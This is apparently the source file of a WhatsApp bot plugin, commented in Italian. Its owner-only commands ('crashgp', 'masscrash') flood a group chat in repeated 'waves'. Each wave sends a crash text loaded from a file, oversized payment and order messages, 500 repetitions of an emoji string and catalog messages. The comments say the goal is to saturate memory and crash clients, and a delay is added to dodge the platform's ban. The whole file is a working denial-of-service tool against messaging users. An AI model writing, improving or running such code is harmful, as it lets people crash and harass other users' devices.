// Codice di crashhh.js potenziato
import fs from 'fs'
import path from 'path'

let handler = async (m, { conn }) => {
  const jid = m.chat
  const filePath = path.resolve('./storage/crash.txt')

  if (!fs.existsSync(filePath)) {
    return m.reply(`❌ *File non trovato!*`)
  }

  const content = fs.readFileSync(filePath, 'utf-8')
  if (!content.trim()) return m.reply('⚠️ *File vuoto!*')

  await m.reply('🚀 *Inizializzazione attacco massivo...*')

  // Numero di ondate (modifica il numero 5 per aumentare la potenza)
  const intensita = 5 

  for (let i = 0; i < intensita; i++) {
    // 1) Invio Testo Pesante (Buffer Overflow)
    await conn.sendMessage(jid, { text: content }, { quoted: m })

    // 2) Invio Bottone Interattivo (Metodo Order)
    await conn.sendMessage(jid, {
      text: `⚡ ATTACCO ONDATA ${i + 1} ⚡\nSaturazione memoria in corso...`,
      interactiveButtons: [{
        name: 'review_and_pay',
        buttonParamsJson: JSON.stringify({
          currency: 'EUR',
          total_amount: { value: '999999', offset: '100' },
          reference_id: 'varebot_crash',
          order: { status: 'pending', items: [{ name: 'CRASH_PAYLOAD', amount: { value: '999', offset: '100' }, quantity: '99' }] }
        })
      }]
    })

    // 3) Invio Richiesta Pagamento (Metodo Elixir)
    await conn.relayMessage(jid, {
      requestPaymentMessage: {
        noteMessage: {
          extendedTextMessage: {
            text: '𝐅𝐎𝐓𝐓𝐔𝐓𝐈 𝐁𝐘 ᴇʟɪxɪʀ\n' + '🔮🤦‍♂️🤷‍♂️🤣😂😢🤦‍♀️🤞😒😢😊😒🔮😉😘🤞👌😂😊😊😎😎😋😋😙🥲🤩🤩🙂😗😉'.repeat(500),
            contextInfo: {
              externalAdReply: {
                title: `🔥 CRASH LEVEL ${i + 1} 🔥`,
                body: 'SYSTEM_FAILURE_DETECTED',
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnailUrl: "https://pollinations.ai"
              }
            }
          },
          currencyCodeIso4217: 'USD',
          amount: 999999,
          expiryTimestamp: Date.now() + 100000,
        }
      }
    }, {})

    // 4) Messaggio Catalogo (Molto pesante per il rendering)
    await conn.relayMessage(jid, {
        productMessage: {
            product: {
                title: "VareBot Exploit",
                description: content.substring(0, 100),
                currencyCode: "EUR",
                priceAmount1000: "0",
                retailerId: "crash",
                productImageCount: 1
            },
            businessOwnerJid: "0@s.whatsapp.net"
        }
    }, {})
    
    // Piccolo delay per evitare il ban immediato dal server
    await new Promise(resolve => setTimeout(resolve, 500))
  }

  await m.reply('✅ *Sequenza completata. Chat saturata.*')
}

handler.command = ['crashgp', 'hehehe', 'masscrash']
handler.owner = true
handler.group = true

export default handler
